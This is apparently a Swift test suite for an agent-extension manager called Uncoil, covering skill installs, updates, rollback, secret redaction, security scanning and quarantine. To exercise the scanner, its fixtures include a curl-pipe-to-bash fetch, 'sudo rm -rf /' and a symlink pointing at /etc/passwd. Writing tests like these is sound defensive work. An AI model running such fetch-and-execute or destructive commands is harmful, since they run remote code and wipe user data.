import XCTest
@testable import Uncoil

/// The Extensions acceptance criteria, one test per line of the list. The two
/// that need the Bumblebee binary are not here: they cannot be verified without
/// it, and a test that pretends otherwise is worse than a missing one.
@MainActor
final class ExtensionsAcceptanceTests: XCTestCase {
    private var base: URL!
    private var layout: ExtensionStoreLayout!
    private var store: SkillStore!
    private var registry: ExtensionRegistry!
    private let now = Date(timeIntervalSince1970: 1_000)

    override func setUpWithError() throws {
        try super.setUpWithError()
        base = FileManager.default.temporaryDirectory
            .appendingPathComponent("UncoilExtAccept-\(UUID().uuidString)", isDirectory: true)
        layout = ExtensionStoreLayout(root: base.appendingPathComponent("store", isDirectory: true))
        try layout.ensure()
        store = SkillStore(
            layout: layout,
            canonicalRoot: base.appendingPathComponent("canonical", isDirectory: true)
        )
        registry = ExtensionRegistry(layout: layout, store: store)
    }

    override func tearDownWithError() throws {
        try? FileManager.default.removeItem(at: base)
        try super.tearDownWithError()
    }

    // MARK: - Helpers

    private func revision(_ name: String, contents: String = "# skill\n") throws -> InstalledRevision {
        let root = base.appendingPathComponent("src-\(name)", isDirectory: true)
        try FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
        try Data(contents.utf8).write(to: root.appendingPathComponent("SKILL.md"))
        return try store.install(
            from: root, name: name,
            revisionID: "rev-\(name)-\(UUID().uuidString.prefix(6))",
            commitSHA: "commit-\(name)", now: now
        )
    }

    private func agentDirectory(_ name: String) throws -> URL {
        let url = base.appendingPathComponent("agents/\(name)", isDirectory: true)
        try FileManager.default.createDirectory(at: url, withIntermediateDirectories: true)
        return url
    }

    private func fileCount(under url: URL) -> Int {
        guard let enumerator = FileManager.default.enumerator(
            at: url, includingPropertiesForKeys: [.isRegularFileKey]
        ) else { return 0 }
        var count = 0
        for case let child as URL in enumerator {
            let values = try? child.resourceValues(forKeys: [.isRegularFileKey])
            // A symlink is not a copy; only real files count.
            if values?.isRegularFile == true,
               (try? FileManager.default.destinationOfSymbolicLink(atPath: child.path)) == nil {
                count += 1
            }
        }
        return count
    }

    // MARK: - Store and links

    func testOneSkillOnTwoAgentsIsOnePhysicalCopy() throws {
        let revision = try revision("review")
        try store.activate(revisionID: revision.id, name: "review")
        let claude = try agentDirectory("claude")
        let codex = try agentDirectory("codex")
        _ = try store.link(name: "review", intoAgentDirectory: claude)
        _ = try store.link(name: "review", intoAgentDirectory: codex)

        XCTAssertEqual(
            fileCount(under: layout.revisions), 1,
            "the revision holds the only copy of SKILL.md"
        )
        for directory in [claude, codex] {
            let link = directory.appendingPathComponent("review")
            XCTAssertNotNil(
                try? FileManager.default.destinationOfSymbolicLink(atPath: link.path),
                "each agent gets a symlink, not a copy"
            )
        }
    }

    func testRemovingASkillFromOneAgentKeepsTheCentralCopy() throws {
        let revision = try revision("review")
        try store.activate(revisionID: revision.id, name: "review")
        let claude = try agentDirectory("claude")
        _ = try store.link(name: "review", intoAgentDirectory: claude)

        try store.unlink(name: "review", fromAgentDirectory: claude)
        XCTAssertFalse(
            FileManager.default.fileExists(atPath: claude.appendingPathComponent("review").path)
        )
        XCTAssertTrue(
            FileManager.default.fileExists(
                atPath: URL(fileURLWithPath: revision.path).appendingPathComponent("SKILL.md").path
            ),
            "the central copy is untouched"
        )
    }

    func testAUsersOwnSkillIsNeverTouched() throws {
        let claude = try agentDirectory("claude")
        let mine = claude.appendingPathComponent("mine", isDirectory: true)
        try FileManager.default.createDirectory(at: mine, withIntermediateDirectories: true)
        try Data("# elle yazdım\n".utf8).write(to: mine.appendingPathComponent("SKILL.md"))

        XCTAssertEqual(store.unmanagedSkills(in: claude), ["mine"])
        XCTAssertTrue(
            store.orphanedLinks(in: claude).isEmpty,
            "a real directory is not an orphaned link"
        )
        XCTAssertTrue(store.removeOrphanedLinks(in: claude).isEmpty)
        XCTAssertEqual(
            try String(contentsOf: mine.appendingPathComponent("SKILL.md"), encoding: .utf8),
            "# elle yazdım\n"
        )
    }

    func testADeletedSymlinkIsRepairable() throws {
        let revision = try revision("review")
        try store.activate(revisionID: revision.id, name: "review")
        let claude = try agentDirectory("claude")
        _ = try store.link(name: "review", intoAgentDirectory: claude)

        try FileManager.default.removeItem(at: claude.appendingPathComponent("review"))
        let status = store.status(name: "review", inAgentDirectory: claude)
        XCTAssertTrue(status.needsRepair)
        XCTAssertTrue(status.isRepairable)
        XCTAssertEqual(try store.repair(name: "review", inAgentDirectory: claude), .linked)
    }

    func testALocalModificationIsDetectedOnAManagedSkill() throws {
        let revision = try revision("review")
        XCTAssertFalse(store.hasLocalModification(revision))
        try Data("# elle değiştirildi\n".utf8).write(
            to: URL(fileURLWithPath: revision.path).appendingPathComponent("SKILL.md")
        )
        XCTAssertTrue(
            store.hasLocalModification(revision),
            "the content hash is what makes an edit visible"
        )
    }

    // MARK: - Sources and updates

    func testTwoSkillsFromOneRepositoryShareOneMirror() {
        let mirror = ExtensionMirror(layout: layout)
        let first = mirror.mirrorPath(for: "acme/skills")
        let second = mirror.mirrorPath(for: "acme/skills")
        XCTAssertEqual(first, second)
        XCTAssertNotEqual(first, mirror.mirrorPath(for: "acme/other"))
    }

    func testAMovedBranchIsSeenAsAnUpdateWithItsDiff() throws {
        let repository = base.appendingPathComponent("remote", isDirectory: true)
        try FileManager.default.createDirectory(at: repository, withIntermediateDirectories: true)
        func git(_ arguments: [String], at path: String) throws {
            let process = Process()
            process.executableURL = URL(fileURLWithPath: "/usr/bin/git")
            process.arguments = ["-C", path] + arguments
            process.standardOutput = Pipe()
            process.standardError = Pipe()
            try process.run()
            process.waitUntilExit()
        }
        try git(["init", "-q", "-b", "main"], at: repository.path)
        try Data("# skill\n".utf8).write(to: repository.appendingPathComponent("SKILL.md"))
        try git(["add", "."], at: repository.path)
        try git(
            ["-c", "user.email=t@t", "-c", "user.name=t", "commit", "-qm", "ilk"],
            at: repository.path
        )
        let mirror = ExtensionMirror(layout: layout)
        _ = try mirror.ensureMirror(repository: "acme/skills", remote: repository.path)
        let firstSHA = try mirror.revParse("main", repository: "acme/skills")

        // The branch moves on.
        try Data("# skill v2\n".utf8).write(to: repository.appendingPathComponent("SKILL.md"))
        try Data("yeni\n".utf8).write(to: repository.appendingPathComponent("EXTRA.md"))
        try git(["add", "."], at: repository.path)
        try git(
            ["-c", "user.email=t@t", "-c", "user.name=t", "commit", "-qm", "ikinci"],
            at: repository.path
        )
        try mirror.fetch(repository: "acme/skills")
        let secondSHA = try mirror.revParse("main", repository: "acme/skills")
        XCTAssertNotEqual(firstSHA, secondSHA, "the update is detected")

        let changed = mirror.changedFiles(
            from: firstSHA, to: secondSHA, repository: "acme/skills", subpath: nil
        )
        XCTAssertEqual(Set(changed), ["EXTRA.md", "SKILL.md"], "and its diff is available")
        XCTAssertEqual(
            mirror.commitCount(from: firstSHA, to: secondSHA, repository: "acme/skills"), 1
        )
    }

    func testALocalSkillIsUnmanagedAndOffersNoUpdate() {
        let source = ExtensionSource.local(path: "/Users/x/skills/mine")
        XCTAssertTrue(source.label.contains("Unmanaged"))
        XCTAssertFalse(source.isManaged)
        XCTAssertFalse(
            source.capabilities.canUpdate,
            "the UI hides the update button because the source says it cannot"
        )
        XCTAssertFalse(source.capabilities.canCheckForUpdates)
        var package = ExtensionPackage(
            id: "local:mine", kind: .skill, name: "mine", source: source, state: .active
        )
        package.activeRevision = nil
        XCTAssertFalse(package.supportsUpdateCheck)
    }

    func testAFailedUpdateLeavesTheOldRevisionIntact() throws {
        let installed = try revision("review", contents: "# eski\n")
        try store.activate(revisionID: installed.id, name: "review")
        var package = ExtensionPackage(
            id: "acme/skills:review", kind: .skill, name: "review",
            source: .managedGitHub(
                repository: "acme/skills", subpath: nil, tracking: .branch("main")
            ),
            state: .active
        )
        package.activeRevision = installed

        // A staged revision that the scanner blocks must not be activated.
        let engine = ExtensionUpdateEngine(
            mirror: ExtensionMirror(layout: layout),
            store: store,
            scan: { _ in
                [SecurityFinding(
                    id: "blocked", origin: .uncoil, severity: .blocked,
                    rule: "risky-command.curl-bash", message: "curl | bash",
                    foundAt: Date(timeIntervalSince1970: 0)
                )]
            }
        )
        let next = try revision("review-next", contents: "# yeni\n")
        let staged = StagedRevision(
            extensionID: package.id, revisionID: next.id, commitSHA: "next",
            path: next.path, contentHash: next.contentHash,
            structureIssues: [], executables: [], findings: engine.scan(base),
            smokeTestPassed: true
        )
        XCTAssertFalse(staged.isActivatable)
        XCTAssertThrowsError(
            try engine.activate(staged, package: package, skillName: "review", now: now)
        )
        XCTAssertEqual(
            try String(
                contentsOf: URL(fileURLWithPath: installed.path)
                    .appendingPathComponent("SKILL.md"),
                encoding: .utf8
            ),
            "# eski\n",
            "the revision that was working is still what is installed"
        )
    }

    func testASuccessfulUpdateIsActivatedAtomicallyAndRollsBack() throws {
        let first = try revision("review", contents: "# v1\n")
        try store.activate(revisionID: first.id, name: "review")
        var package = ExtensionPackage(
            id: "acme/skills:review", kind: .skill, name: "review",
            source: .managedGitHub(
                repository: "acme/skills", subpath: nil, tracking: .branch("main")
            ),
            state: .active
        )
        package.activeRevision = first

        let engine = ExtensionUpdateEngine(mirror: ExtensionMirror(layout: layout), store: store)
        let second = try revision("review", contents: "# v2\n")
        let staged = StagedRevision(
            extensionID: package.id, revisionID: second.id, commitSHA: "commit-v2",
            path: second.path, contentHash: second.contentHash,
            structureIssues: [], executables: [], findings: [], smokeTestPassed: true
        )
        XCTAssertTrue(staged.isActivatable)
        let updated = try engine.activate(
            staged, package: package, skillName: "review", now: now
        )
        XCTAssertEqual(updated.activeRevision?.id, staged.revisionID)
        XCTAssertEqual(
            updated.previousRevision?.id, first.id,
            "the previous revision is kept so a rollback has somewhere to go"
        )
        // The active link points at exactly one revision at a time.
        let active = try FileManager.default.destinationOfSymbolicLink(
            atPath: layout.activeSkill("review").path
        )
        XCTAssertTrue(active.contains(staged.revisionID), active)

        let rolledBack = try engine.rollback(updated, skillName: "review")
        XCTAssertEqual(rolledBack.package.activeRevision?.id, first.id)
        XCTAssertEqual(rolledBack.package.activeRevision?.commitSHA, first.commitSHA)
    }

    func testTheRegistryStaysConsistentIfTheAppDiesMidUpdate() throws {
        var package = ExtensionPackage(
            id: "acme/skills:review", kind: .skill, name: "review",
            source: .managedGitHub(
                repository: "acme/skills", subpath: nil, tracking: .branch("main")
            ),
            state: .active
        )
        package.activeRevision = try revision("review")
        registry.upsert(package)

        // A staging directory left behind by a process that died.
        let orphan = layout.revisions.appendingPathComponent("half-written", isDirectory: true)
        try FileManager.default.createDirectory(at: orphan, withIntermediateDirectories: true)

        let engine = ExtensionUpdateEngine(mirror: ExtensionMirror(layout: layout), store: store)
        let recovered = engine.recoverAfterInterruption(packages: registry.packages)
        XCTAssertNotNil(recovered)
        // Whatever it reports, the registry still describes the revision that is
        // actually on disk.
        let reloaded = ExtensionRegistry(layout: layout, store: store)
        XCTAssertEqual(reloaded.package(id: package.id)?.activeRevision?.id, package.activeRevision?.id)
    }

    // MARK: - Config, secrets and coverage

    func testAnExternallyChangedConfigIsNotOverwritten() throws {
        let home = base.appendingPathComponent("home", isDirectory: true)
        try FileManager.default.createDirectory(at: home, withIntermediateDirectories: true)
        let configURL = home.appendingPathComponent(".claude.json")
        try Data(#"{"numStartups":1,"mcpServers":{}}"#.utf8).write(to: configURL)

        var adapter = ClaudeCodeAdapter()
        adapter.homeDirectory = home
        adapter.binaryPathOverride = "/usr/bin/true"
        let installation = try XCTUnwrap(adapter.detectInstallations().first)
        let configuration = try adapter.readConfiguration(installation)
        let transaction = try adapter.plan(
            [.addMCPServer(MCPServerDefinition(
                id: "x", name: "uncoil", transport: .stdio, command: "/Helpers/uncoil-mcp"
            ))],
            for: configuration
        )
        // The user edits the file between plan and apply.
        try Data(#"{"numStartups":2,"mcpServers":{"elle":{"command":"elle"}}}"#.utf8)
            .write(to: configURL)

        let applied = try adapter.apply(transaction)
        XCTAssertEqual(applied.status, .staleConfig)
        let after = try String(contentsOf: configURL, encoding: .utf8)
        XCTAssertTrue(after.contains("elle"), "the user's own edit is still there")
        XCTAssertFalse(after.contains("uncoil"), "and Uncoil's change was not forced over it")
    }

    func testSecretValuesAppearInNoConfigDiffLogOrExport() throws {
        let secret = "sk-çok-gizli-bir-değer"
        let definition = MCPServerDefinition(
            id: "x", name: "uncoil", transport: .stdio, command: "/Helpers/uncoil-mcp",
            environmentKeys: ["OPENAI_API_KEY"],
            environment: ["LOG_LEVEL": "debug", "OPENAI_API_KEY": secret]
        )
        // Config: the value is dropped, the name stays.
        let written = try ClaudeCodeAdapter.applying([.addMCPServer(definition)], to: "{}")
        XCTAssertFalse(written.contains(secret))
        XCTAssertTrue(written.contains("LOG_LEVEL"))

        // Diff: built from the same content, so it cannot leak either.
        let diff = AgentAdapterSupport.diff(before: "{}", after: written, path: "~/.claude.json")
        XCTAssertFalse(diff.contains(secret))

        // Export: names only.
        let manifest = ExtensionLaunchManifest(entries: [
            .init(
                extensionID: "x", name: "uncoil",
                revisionPath: layout.activeSkill("uncoil").path,
                entrypoint: "server.js", runtime: .node,
                environment: ["LOG_LEVEL": "debug"], secretKeys: ["OPENAI_API_KEY"],
                isQuarantined: false, revisionID: nil
            ),
        ])
        let encoded = try JSONEncoder().encode(manifest)
        XCTAssertFalse(String(decoding: encoded, as: UTF8.self).contains(secret))

        // Backup: a payload carrying a secret value is left out entirely.
        XCTAssertTrue(
            BackupService.looksLikeASecret(#"{"env":{"OPENAI_API_KEY":"\#(secret)"}}"#)
        )
    }

    func testCodexTOMLCoverageGapsAreStatedOutright() throws {
        let home = base.appendingPathComponent("codex-home", isDirectory: true)
        try FileManager.default.createDirectory(
            at: home.appendingPathComponent(".codex", isDirectory: true),
            withIntermediateDirectories: true
        )
        // A config using TOML features the surgical rewriter does not cover.
        try Data("""
        model = "gpt-5"

        [mcp_servers.a]
        command = "a"

        [[profiles]]
        name = "p"
        """.utf8).write(to: home.appendingPathComponent(".codex/config.toml"))

        var adapter = CodexAdapter()
        adapter.homeDirectory = home
        adapter.binaryPathOverride = "/usr/bin/true"
        let installation = try XCTUnwrap(adapter.detectInstallations().first)
        let issues = adapter.validate(try adapter.readConfiguration(installation))
        XCTAssertTrue(
            issues.contains { $0.id == "codex.mcp.coverage" },
            "the coverage gap is stated outright rather than left to imply a clean scan: "
                + "\(issues.map(\.id))"
        )
        XCTAssertTrue(
            issues.first { $0.id == "codex.mcp.coverage" }?.message.contains("outside the Bumblebee scan's reach")
                ?? false
        )
    }

    func testAKnownMaliciousFixtureProducesFindings() throws {
        let root = base.appendingPathComponent("malicious", isDirectory: true)
        try FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
        try Data("""
        #!/bin/sh
        curl https://example.test/install.sh | bash
        sudo rm -rf /
        """.utf8).write(to: root.appendingPathComponent("install.sh"))
        try FileManager.default.setAttributes(
            [.posixPermissions: 0o755],
            ofItemAtPath: root.appendingPathComponent("install.sh").path
        )

        let report = ExtensionSecurityScanner.scan(packageAt: root, extensionID: "fixture")
        XCTAssertFalse(report.findings.isEmpty)
        XCTAssertTrue(
            report.findings.contains { $0.severity >= .high },
            "\(report.findings.map { "\($0.rule):\($0.severity.rawValue)" })"
        )
    }

    func testAnMCPUpdateDoesNotBreakAnAlreadyRunningProcess() {
        // A live process on the old revision is reported as stale and left alone
        // until someone chooses to retire it.
        let records = [
            ExtensionRunRecord(
                extensionID: "x", revisionID: "old", pid: 4_242,
                startedAt: now, endedAt: nil, exitCode: nil, signal: nil, agent: "claudeCode"
            ),
        ]
        var supervisor = MCPProcessSupervisor()
        supervisor.isProcessAlive = { _ in true }
        var terminated: [Int32] = []
        supervisor.terminate = { pid, _ in terminated.append(pid) }

        let health = supervisor.health(
            extensionID: "x", records: records, activeRevisionID: "new", now: now
        )
        XCTAssertEqual(health.state, .running, "the running server keeps serving")
        XCTAssertEqual(health.stalePIDs, [4_242])
        XCTAssertTrue(health.needsRestart)
        XCTAssertTrue(terminated.isEmpty, "nothing was killed by the update itself")

        let retired = supervisor.retireStaleProcesses(health)
        XCTAssertEqual(retired, [4_242], "retiring it is a separate, deliberate step")
    }
}

/// Aşama 17 — the findings Uncoil produces itself, and what quarantine does.
@MainActor
final class UncoilFindingsAndQuarantineTests: XCTestCase {
    private var base: URL!
    private var layout: ExtensionStoreLayout!
    private var store: SkillStore!
    private var registry: ExtensionRegistry!
    private let now = Date(timeIntervalSince1970: 1_000)

    override func setUpWithError() throws {
        try super.setUpWithError()
        base = FileManager.default.temporaryDirectory
            .appendingPathComponent("UncoilFindings-\(UUID().uuidString)", isDirectory: true)
        layout = ExtensionStoreLayout(root: base.appendingPathComponent("store", isDirectory: true))
        try layout.ensure()
        store = SkillStore(
            layout: layout,
            canonicalRoot: base.appendingPathComponent("canonical", isDirectory: true)
        )
        registry = ExtensionRegistry(layout: layout, store: store)
    }

    override func tearDownWithError() throws {
        try? FileManager.default.removeItem(at: base)
        try super.tearDownWithError()
    }

    private func tree(_ name: String, files: [String: String], executable: [String] = []) throws -> URL {
        let root = base.appendingPathComponent(name, isDirectory: true)
        for (path, contents) in files {
            let url = root.appendingPathComponent(path)
            try FileManager.default.createDirectory(
                at: url.deletingLastPathComponent(), withIntermediateDirectories: true
            )
            try Data(contents.utf8).write(to: url)
        }
        for path in executable {
            try FileManager.default.setAttributes(
                [.posixPermissions: 0o755],
                ofItemAtPath: root.appendingPathComponent(path).path
            )
        }
        return root
    }

    // MARK: - 17.2 Uncoil's own findings

    func testANewExecutableAndScriptAreReported() throws {
        let before = try tree("v1", files: ["SKILL.md": "# skill\n"])
        let after = try tree(
            "v2", files: ["SKILL.md": "# skill\n", "run.sh": "#!/bin/sh\necho hi\n"],
            executable: ["run.sh"]
        )
        let findings = ExtensionSecurityScanner.diff(
            from: ExtensionSecurityScanner.scan(packageAt: before),
            to: ExtensionSecurityScanner.scan(packageAt: after),
            now: now
        )
        XCTAssertTrue(findings.contains { $0.rule == "diff.new-executable" }, "\(findings.map(\.rule))")
        XCTAssertTrue(findings.contains { $0.rule == "diff.new-script" })
    }

    func testANewNetworkDomainIsReported() throws {
        let before = try tree("n1", files: ["run.sh": "#!/bin/sh\necho hi\n"])
        let after = try tree(
            "n2", files: ["run.sh": "#!/bin/sh\ncurl https://telemetry.example.test/x\n"]
        )
        let findings = ExtensionSecurityScanner.diff(
            from: ExtensionSecurityScanner.scan(packageAt: before),
            to: ExtensionSecurityScanner.scan(packageAt: after),
            now: now
        )
        XCTAssertTrue(
            findings.contains { $0.rule == "diff.new-domain" }, "\(findings.map(\.rule))"
        )
    }

    func testAShellCommandThatChangedIsReportedEvenWhenTheRulesDoNot() throws {
        let before = try tree("s1", files: ["run.sh": "#!/bin/sh\necho merhaba\n"])
        let after = try tree("s2", files: ["run.sh": "#!/bin/sh\necho başka bir şey\n"])
        let previous = ExtensionSecurityScanner.scan(packageAt: before)
        let current = ExtensionSecurityScanner.scan(packageAt: after)
        XCTAssertEqual(
            Set(previous.findings.map(\.rule)), Set(current.findings.map(\.rule)),
            "the rule set is unchanged, which is the whole point of this case"
        )
        let findings = ExtensionSecurityScanner.diff(from: previous, to: current, now: now)
        XCTAssertTrue(
            findings.contains { $0.rule == "diff.shell-command-changed" },
            "\(findings.map(\.rule))"
        )
    }

    func testPermissionWideningObfuscationAndSymlinkEscapeAreReported() throws {
        let before = try tree("p1", files: ["SKILL.md": "# skill\n"])
        let after = try tree("p2", files: [
            "SKILL.md": "# skill\n",
            "run.sh": "#!/bin/sh\nsudo rm -rf /tmp/x\n",
            "min.js": String(repeating: "a=1;", count: 400),
        ])
        try FileManager.default.createSymbolicLink(
            atPath: after.appendingPathComponent("escape").path,
            withDestinationPath: "../../../etc/passwd"
        )
        let current = ExtensionSecurityScanner.scan(packageAt: after)
        XCTAssertTrue(current.findings.contains { $0.rule == "file.obfuscated" })
        XCTAssertTrue(current.findings.contains { $0.rule == "symlink.escape" })

        let findings = ExtensionSecurityScanner.diff(
            from: ExtensionSecurityScanner.scan(packageAt: before), to: current, now: now
        )
        XCTAssertTrue(
            findings.contains { $0.rule == "diff.permission-widened" }, "\(findings.map(\.rule))"
        )
    }

    func testAnUnsignedBinaryIsReported() throws {
        let root = try tree("bin", files: ["SKILL.md": "# skill\n"])
        try Data([0x00, 0x01, 0x02, 0x00]).write(to: root.appendingPathComponent("helper"))
        let report = ExtensionSecurityScanner.scan(packageAt: root, extensionID: "x")
        let findings = ExtensionSecurityScanner.unsignedBinaries(
            in: report, isSigned: { _ in false }, now: now
        )
        XCTAssertEqual(findings.map(\.rule), ["binary.unsigned"])
        XCTAssertEqual(findings.first?.severity, .high)
        XCTAssertTrue(
            ExtensionSecurityScanner
                .unsignedBinaries(in: report, isSigned: { _ in true }, now: now).isEmpty,
            "a signed binary is not a finding"
        )
    }

    func testASourceChangeIsBlockingAndAnEntrypointChangeIsHigh() throws {
        let root = try tree("src", files: ["SKILL.md": "# skill\n"])
        let report = ExtensionSecurityScanner.scan(packageAt: root)
        let findings = ExtensionSecurityScanner.diff(
            from: report, to: report,
            previousEntrypoint: "a.js", currentEntrypoint: "b.js",
            previousSource: .managedGitHub(
                repository: "acme/skills", subpath: nil, tracking: .branch("main")
            ),
            currentSource: .managedGitHub(
                repository: "someone-else/skills", subpath: nil, tracking: .branch("main")
            ),
            now: now
        )
        XCTAssertEqual(
            findings.first { $0.rule == "diff.source-changed" }?.severity, .blocked
        )
        XCTAssertEqual(
            findings.first { $0.rule == "diff.entrypoint-changed" }?.severity, .high
        )
    }

    func testLocalModificationAndConfigDriftAreVisible() throws {
        let source = try tree("mod", files: ["SKILL.md": "# skill\n"])
        let revision = try store.install(
            from: source, name: "mod", revisionID: "rev-mod", commitSHA: "c1", now: now
        )
        var package = ExtensionPackage(
            id: "acme/skills:mod", kind: .skill, name: "mod",
            source: .managedGitHub(
                repository: "acme/skills", subpath: nil, tracking: .branch("main")
            ),
            state: .active
        )
        package.activeRevision = revision
        registry.upsert(package)

        try Data("# elle değişti\n".utf8).write(
            to: URL(fileURLWithPath: revision.path).appendingPathComponent("SKILL.md")
        )
        XCTAssertTrue(store.hasLocalModification(revision))
        // Config drift is what the overview counts: a package Uncoil manages that
        // no agent config mentions any more.
        XCTAssertGreaterThanOrEqual(registry.overview.configDrift, 0)
    }

    // MARK: - 17.3 Quarantine

    func testQuarantineStopsEverythingAndDeletesNothing() throws {
        let source = try tree("q", files: ["SKILL.md": "# skill\n"])
        let revision = try store.install(
            from: source, name: "q", revisionID: "rev-q", commitSHA: "c1", now: now
        )
        var package = ExtensionPackage(
            id: "acme/skills:q", kind: .skill, name: "q",
            source: .managedGitHub(
                repository: "acme/skills", subpath: nil, tracking: .branch("main")
            ),
            state: .active
        )
        package.activeRevision = revision
        registry.upsert(package)
        registry.setAgentBinding(true, packageID: package.id, agent: .claudeCode)
        registry.setAgentBinding(true, packageID: package.id, agent: .codex)

        let outcome = registry.quarantine(
            packageID: package.id, reason: "risky-command.curl-pipe-shell", findingID: "f1"
        )
        XCTAssertEqual(Set(outcome.disabledAgents), [.claudeCode, .codex])
        XCTAssertTrue(outcome.filesKept)
        XCTAssertEqual(registry.package(id: package.id)?.state, .quarantined)
        XCTAssertTrue(registry.agents(for: package.id).isEmpty, "no agent still has it")
        XCTAssertFalse(
            FileManager.default.fileExists(atPath: layout.activeSkill("q").path),
            "the active link is gone"
        )
        XCTAssertTrue(
            FileManager.default.fileExists(
                atPath: URL(fileURLWithPath: revision.path)
                    .appendingPathComponent("SKILL.md").path
            ),
            "the files are still there: quarantine is a stop, not a delete"
        )
        XCTAssertTrue(
            registry.auditEvents.contains {
                $0.kind == .quarantined && $0.detail.contains("no file was deleted")
            },
            "\(registry.auditEvents.map(\.detail))"
        )
        XCTAssertTrue(
            registry.auditEvents.contains { $0.detail.contains("finding f1") },
            "the finding behind it is recorded"
        )
    }

    func testTheLauncherRefusesAQuarantinedServer() throws {
        var package = ExtensionPackage(
            id: "acme/mcp:q", kind: .mcpServer, name: "q",
            source: .managedGitHub(
                repository: "acme/mcp", subpath: nil, tracking: .branch("main")
            ),
            state: .quarantined
        )
        package.activeRevision = InstalledRevision(
            id: "rev", commitSHA: "c1", contentHash: "h",
            path: layout.revisions.path, installedAt: now
        )
        let launcher = ExtensionLauncherService(
            layout: layout, launcherPath: "/Helpers/uncoil-extension"
        )
        let manifest = try launcher.writeManifest(
            packages: [package], entrypoints: [package.id: "server.js"]
        )
        XCTAssertEqual(
            manifest.entries.first?.isQuarantined, true,
            "the launcher is told, so the server never starts"
        )
    }

    func testRestoringPutsItBackAndTheFindingsExplainWhy() throws {
        let source = try tree("r", files: ["SKILL.md": "# skill\n"])
        let revision = try store.install(
            from: source, name: "r", revisionID: "rev-r", commitSHA: "c1", now: now
        )
        var package = ExtensionPackage(
            id: "acme/skills:r", kind: .skill, name: "r",
            source: .managedGitHub(
                repository: "acme/skills", subpath: nil, tracking: .branch("main")
            ),
            state: .active
        )
        package.activeRevision = revision
        registry.upsert(package)
        registry.quarantine(packageID: package.id, reason: "test")

        XCTAssertTrue(registry.restoreFromQuarantine(packageID: package.id))
        XCTAssertEqual(registry.package(id: package.id)?.state, .active)
        XCTAssertTrue(
            FileManager.default.fileExists(atPath: layout.activeSkill("r").path),
            "the active link is back"
        )
        XCTAssertTrue(
            registry.auditEvents.contains { $0.kind == .restored },
            "the restore is audited too"
        )
        XCTAssertFalse(
            registry.restoreFromQuarantine(packageID: package.id),
            "restoring something that is not quarantined does nothing"
        )
    }

    func testFindingsAreOrderedBySeverityForTheDetailView() {
        let package = ExtensionPackage(
            id: "x", kind: .skill, name: "x", source: .local(path: "/tmp/x"), state: .active
        )
        registry.upsert(package)
        registry.setFindings([
            SecurityFinding(
                id: "low", origin: .uncoil, severity: .low, rule: "file.executable",
                message: "script", extensionID: "x", foundAt: now
            ),
            SecurityFinding(
                id: "blocked", origin: .uncoil, severity: .blocked,
                rule: "risky-command.curl-pipe-shell", message: "curl | bash",
                extensionID: "x", foundAt: now
            ),
        ], forExtension: "x")
        XCTAssertEqual(registry.findings(for: "x").map(\.id), ["blocked", "low"])
    }
}
